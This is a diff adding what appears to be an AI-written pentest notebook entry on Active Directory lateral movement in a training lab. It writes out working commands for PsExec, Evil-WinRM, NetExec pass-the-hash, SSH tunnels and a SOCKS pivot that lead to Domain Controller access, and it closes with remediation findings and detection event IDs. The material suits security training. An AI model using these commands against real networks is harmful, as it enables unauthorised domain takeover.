@@ -2051,3 +2051,553 @@ associated with accounts configured without pre-authentication.
 ```
 
 ---
+Absolutely. I’ll structure it in **two layers**:
+
+1. **Engagement-ready note** — written like something you could actually keep in a pentest/Red Team engagement notebook: concise, operational, evidence-focused, and organized around objectives, prerequisites, commands, findings, and detection/mitigation.
+2. **Cyber-student explanation** — then I’ll slow down and explain *why* each technique works, what is happening under the hood, and how the techniques chain together.
+
+I’ll base the note on the material you provided rather than silently adding techniques that aren't covered there.
+
+# 1. Engagement-Ready Lateral Movement Note
+
+## Active Directory Lateral Movement
+
+### Objective
+
+Assess whether compromised credentials can be reused to move from an initial foothold to additional Windows hosts and ultimately reach Tier-0 assets such as the Domain Controller.
+
+Primary techniques assessed:
+
+* Remote execution via SMB/PsExec
+* WinRM/Evil-WinRM
+* Pass-the-Hash
+* Credential reuse
+* SSH pivoting/SOCKS
+* Remote execution through a pivot
+* Detection and defensive controls
+
+---
+
+## Initial Environment
+
+| Host      | IP               | Role                            | Initial Access                  |
+| --------- | ---------------- | ------------------------------- | ------------------------------- |
+| WebServer | `192.168.13.71`  | Linux pivot / internal services | SSH                             |
+| WRK       | `192.168.13.61`  | Windows workstation             | Local admin via `jdoe`          |
+| SERVER1   | `192.168.13.51`  | Windows server                  | Remote Management Users         |
+| ROOTDC    | `192.168.13.100` | Domain Controller               | Initially inaccessible directly |
+
+Initial credentials:
+
+```text
+User: jdoe
+Password: [credential obtained during engagement]
+```
+
+Network topology is segmented such that the AttackBox cannot directly reach some internal services, particularly the Domain Controller.
+
+---
+
+# Phase 1 — Remote Execution
+
+### Objective
+
+Determine whether the compromised account can execute commands remotely on Windows hosts.
+
+### PsExec
+
+Where the authenticated account has local administrator privileges, PsExec can be used to remotely execute commands through SMB and the Service Control Manager.
+
+Example:
+
+```bash
+psexec.py DOMAIN/user:'PASSWORD'@TARGET
+```
+
+Successful execution results in a remote command shell.
+
+Validation:
+
+```cmd
+whoami
+hostname
+```
+
+Expected privilege level when using an administrative PsExec session:
+
+```text
+nt authority\system
+```
+
+### Engagement significance
+
+A valid credential combined with local administrator privileges can convert simple credential access into **remote code execution**.
+
+Record:
+
+* Source host
+* Destination host
+* Account used
+* Authentication method
+* Privilege obtained
+* Evidence of successful execution
+
+---
+
+# Phase 2 — WinRM
+
+Where the account belongs to the appropriate remote-management group, WinRM can provide a PowerShell session without requiring local administrator privileges in every scenario.
+
+Example:
+
+```bash
+evil-winrm -i TARGET -u USER -p 'PASSWORD'
+```
+
+Validate:
+
+```powershell
+whoami
+hostname
+```
+
+### Engagement significance
+
+WinRM provides an alternative lateral-movement path to SMB-based execution.
+
+When assessing an environment, determine:
+
+```text
+Can the account authenticate?
+Can the account establish a WinRM session?
+What privileges does the resulting session have?
+```
+
+---
+
+# Phase 3 — Credential Discovery
+
+Once administrative access is obtained on a host, inspect locations where credentials may have been left behind.
+
+Example evidence from the lab:
+
+```cmd
+type C:\Users\Administrator\Documents\loot.txt
+```
+
+Result:
+
+```text
+Administrator:500:[LM]:[NT]
+```
+
+The important value for Pass-the-Hash is the **NT hash**.
+
+### Important distinction
+
+| Credential                    | PtH? |
+| ----------------------------- | ---- |
+| NT hash                       | Yes  |
+| Net-NTLMv2 challenge/response | No   |
+
+A raw NT hash can be used for NTLM authentication without knowing the plaintext password.
+
+A Net-NTLMv2 response generally needs to be cracked or otherwise abused through a different technique such as relay.
+
+---
+
+# Phase 4 — Pass-the-Hash
+
+### Objective
+
+Determine whether a recovered NT hash is valid on additional hosts.
+
+NetExec:
+
+```bash
+nxc smb TARGET -u Administrator -H NT_HASH --local-auth
+```
+
+For multiple hosts:
+
+```bash
+nxc smb TARGET1 TARGET2 \
+-u Administrator \
+-H NT_HASH \
+--local-auth
+```
+
+### Evidence
+
+Successful authentication may appear as:
+
+```text
+[+] HOST\Administrator:HASH
+```
+
+Administrative access is indicated by:
+
+```text
+(Pwn3d!)
+```
+
+### Interpretation
+
+```text
+Valid credentials
+        ↓
+Local administrator?
+        ↓
+Yes
+        ↓
+Remote execution possible
+```
+
+The lab demonstrated that the same local Administrator hash was valid on multiple systems, illustrating the risk of local administrator password reuse.
+
+---
+
+# Phase 5 — Remote Shell Using the Hash
+
+Impacket:
+
+```bash
+psexec.py -hashes :NT_HASH Administrator@TARGET
+```
+
+The `-hashes` parameter accepts:
+
+```text
+LM:NT
+```
+
+If only the NT hash is available:
+
+```text
+:NT_HASH
+```
+
+Validate:
+
+```cmd
+whoami
+hostname
+```
+
+Document the resulting privilege.
+
+---
+
+# Phase 6 — Credential Escalation Through Host-to-Host Movement
+
+On the newly compromised host, enumerate relevant files and credential material.
+
+Example from the lab:
+
+```cmd
+type C:\Users\Administrator\Documents\da_creds.txt
+```
+
+The lab demonstrated a second credential:
+
+```text
+THM\Administrator:[RID]:[LM]:[NT]
+```
+
+This represents a **Domain Administrator NT hash**.
+
+### Attack-chain significance
+
+The important finding is not merely the hash itself.
+
+The important finding is:
+
+```text
+Compromised workstation
+        ↓
+Local Administrator hash
+        ↓
+SERVER1
+        ↓
+Domain Administrator credential
+        ↓
+Domain Controller
+```
+
+This demonstrates credential exposure creating an iterative lateral-movement path.
+
+---
+
+# Phase 7 — Network Pivoting
+
+### Finding
+
+The AttackBox cannot directly reach the Domain Controller.
+
+Example:
+
+```bash
+nxc smb 192.168.13.100 -u Administrator -H NT_HASH
+```
+
+Result:
+
+```text
+Connection timeout
+```
+
+The compromised WebServer, however, has network access to the restricted environment.
+
+Therefore:
+
+```text
+AttackBox → WebServer → Internal Network → DC
+```
+
+---
+
+## SSH Local Port Forward
+
+For a single service:
+
+```bash
+ssh -L 13389:192.168.13.100:3389 jdoe@192.168.13.71 -N
+```
+
+The AttackBox then accesses:
+
+```text
+127.0.0.1:13389
+```
+
+Traffic is forwarded through the WebServer to:
+
+```text
+192.168.13.100:3389
+```
+
+Use this approach when only one specific internal service is required.
+
+---
+
+# SSH SOCKS Pivot
+
+For multiple hosts/services:
+
+```bash
+ssh -f -D 1080 jdoe@192.168.13.71 -N
+```
+
+This establishes:
+
+```text
+127.0.0.1:1080
+```
+
+as a SOCKS proxy.
+
+Configure ProxyChains:
+
+```text
+[ProxyList]
+socks4 127.0.0.1 1080
+```
+
+Then route supported tools through the tunnel:
+
+```bash
+proxychains nxc smb 192.168.13.100 \
+-u Administrator \
+-H NT_HASH
+```
+
+If authentication succeeds:
+
+```text
+(Pwn3d!)
+```
+
+Remote execution can then be performed through the proxy:
+
+```bash
+proxychains psexec.py \
+-hashes :NT_HASH \
+DOMAIN/Administrator@192.168.13.100
+```
+
+Validate:
+
+```cmd
+hostname
+whoami
+```
+
+---
+
+# Evidence / Reporting
+
+For every successful lateral movement event, capture:
+
+### Authentication
+
+```text
+Source:
+Destination:
+Username:
+Credential type:
+Authentication protocol:
+```
+
+### Execution
+
+```text
+Tool:
+Protocol:
+Command:
+Privilege:
+```
+
+### Credential exposure
+
+```text
+Credential type:
+Account:
+Source host:
+Storage location:
+Hash/secret:
+```
+
+### Pivot
+
+```text
+Pivot host:
+Attacker-side listener:
+Internal destination:
+Destination port:
+Tunnel type:
+```
+
+### Impact
+
+Document whether access resulted in:
+
+* Local Administrator
+* SYSTEM
+* Domain User
+* Domain Administrator
+* Domain Controller access
+* Sensitive data access
+
+---
+
+# Findings
+
+### Finding 1 — Local Administrator Password Reuse
+
+**Severity:** High/Critical depending on environment and privilege scope.
+
+The same local Administrator credential material was usable across multiple hosts.
+
+**Impact:**
+
+Compromise of one workstation can enable lateral movement to other systems without obtaining additional plaintext credentials.
+
+**Recommendation:**
+
+Deploy Windows LAPS and ensure local administrator credentials are unique and automatically rotated.
+
+---
+
+### Finding 2 — Excessive Local Administrator Access
+
+Users with unnecessary local administrator privileges can turn credential compromise into remote code execution.
+
+**Recommendation:**
+
+Apply least privilege and tiered administration.
+
+---
+
+### Finding 3 — Sensitive Credentials Stored on Hosts
+
+Credentials/hashes associated with privileged accounts were discoverable on compromised systems.
+
+**Impact:**
+
+Credential exposure can create an escalation path from workstation compromise to Domain Administrator.
+
+**Recommendation:**
+
+Prevent privileged credentials from being used on lower-trust systems and deploy PAWs for Tier-0 administration.
+
+---
+
+### Finding 4 — Insufficient Network Segmentation
+
+The compromised WebServer had network connectivity to restricted infrastructure.
+
+**Impact:**
+
+An attacker could use the host as a pivot to access otherwise unreachable services.
+
+**Recommendation:**
+
+Implement VLAN/firewall segmentation and restrict workstation/server/DC communication to legitimate administrative paths.
+
+---
+
+### Finding 5 — SMB/NTLM Exposure
+
+The environment permitted SMB-based authentication and Pass-the-Hash.
+
+**Recommendation:**
+
+Enforce SMB signing, audit and progressively restrict NTLM, and deploy Credential Guard where appropriate.
+
+---
+
+# Detection Opportunities
+
+Monitor for:
+
+| Event          | Significance                           |
+| -------------- | -------------------------------------- |
+| `4624 Type 3`  | Network logon                          |
+| `4624 Type 10` | Remote interactive logon               |
+| `4648`         | Explicit credential use                |
+| `7045`         | Service installation / possible PsExec |
+| `4698`         | Scheduled task creation                |
+| `4688`         | Process creation                       |
+
+Sysmon is particularly useful for process and LSASS-access telemetry.
+
+---
+
+# Attack Chain Summary
+
+```text
+Initial SSH foothold
+        ↓
+WebServer
+        ↓
+Remote access to WRK
+        ↓
+SYSTEM / local administrator access
+        ↓
+Harvest NT hash
+        ↓
+Pass-the-Hash
+        ↓
+SERVER1
+        ↓
+Discover Domain Administrator hash
+        ↓
+SSH SOCKS pivot
+        ↓
+Domain Controller
+        ↓
+Domain Administrator authentication
+        ↓
+SYSTEM
+```
+     
